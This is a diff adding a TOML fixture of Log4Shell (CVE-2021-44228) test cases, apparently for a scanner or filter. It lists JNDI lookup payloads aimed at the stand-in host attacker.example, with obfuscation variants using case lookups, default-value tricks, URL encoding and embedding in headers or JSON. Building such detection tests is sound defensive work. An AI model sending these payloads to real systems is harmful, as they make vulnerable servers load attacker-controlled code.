@@ -1,0 +1,117 @@
+schema = 1
+# Log4Shell / CVE-2021-44228 + obfuscation variants.
+
+[[case]]
+id = "basic_ldap"
+class = "log4shell"
+payload = "${jndi:ldap://attacker.example/a}"
+
+[[case]]
+id = "basic_ldaps"
+class = "log4shell"
+payload = "${jndi:ldaps://attacker.example/a}"
+
+[[case]]
+id = "basic_rmi"
+class = "log4shell"
+payload = "${jndi:rmi://attacker.example/a}"
+
+[[case]]
+id = "basic_dns"
+class = "log4shell"
+payload = "${jndi:dns://attacker.example}"
+
+[[case]]
+id = "basic_iiop"
+class = "log4shell"
+payload = "${jndi:iiop://attacker.example/a}"
+
+[[case]]
+id = "basic_corba"
+class = "log4shell"
+payload = "${jndi:corba://attacker.example/a}"
+
+[[case]]
+id = "basic_nis"
+class = "log4shell"
+payload = "${jndi:nis://attacker.example/a}"
+
+[[case]]
+id = "basic_nds"
+class = "log4shell"
+payload = "${jndi:nds://attacker.example/a}"
+
+[[case]]
+id = "lower_obfuscation"
+class = "log4shell"
+payload = "${${lower:j}ndi:ldap://attacker.example/a}"
+
+[[case]]
+id = "lower_full"
+class = "log4shell"
+payload = "${${lower:j}${lower:n}${lower:d}${lower:i}:ldap://attacker.example/a}"
+
+[[case]]
+id = "upper_obfuscation"
+class = "log4shell"
+payload = "${${upper:j}ndi:ldap://attacker.example/a}"
+
+[[case]]
+id = "double_dollar_default"
+class = "log4shell"
+payload = "${${::-j}${::-n}${::-d}${::-i}:ldap://attacker.example/a}"
+
+[[case]]
+id = "envvar_default_NaN"
+class = "log4shell"
+payload = "${${env:NaN:-j}ndi:ldap://attacker.example/a}"
+
+[[case]]
+id = "envvar_default_path"
+class = "log4shell"
+payload = "${${env:NaN:-j}${env:NaN:-n}${env:NaN:-d}${env:NaN:-i}:ldap://attacker.example/a}"
+
+[[case]]
+id = "sys_property_default"
+class = "log4shell"
+payload = "${${sys:nonExistent:-j}ndi:ldap://attacker.example/a}"
+
+[[case]]
+id = "main_arg_default"
+class = "log4shell"
+payload = "${${main:nonExistent:-j}ndi:ldap://attacker.example/a}"
+
+[[case]]
+id = "wide_lower_brace"
+class = "log4shell"
+payload = "${jndi:ldap://attacker.example/${::-a}}"
+
+[[case]]
+id = "url_enc_dollar"
+class = "log4shell"
+payload = "%24%7Bjndi%3Aldap%3A%2F%2Fattacker.example%2Fa%7D"
+
+[[case]]
+id = "double_url_enc"
+class = "log4shell"
+payload = "%2524%257Bjndi%253Aldap%253A%252F%252Fattacker.example%252Fa%257D"
+
+[[case]]
+id = "unicode_dollar"
+class = "log4shell"
+payload = "${jndi:ldap://attacker.example/a}"
+
+[[case]]
+id = "in_user_agent_style"
+class = "log4shell"
+payload = "Mozilla ${jndi:ldap://attacker.example/a} curl/8"
+
+[[case]]
+id = "json_string_value"
+class = "log4shell"
+payload = "{\"q\":\"${jndi:ldap://attacker.example/a}\"}"
+
+[[case]]
+id = "with_lookup_chain"
+class = "log4shell"
+payload = "${${lower:${lower:j}}${lower:n}${lower:d}${lower:i}:ldap://attacker.example/a}"
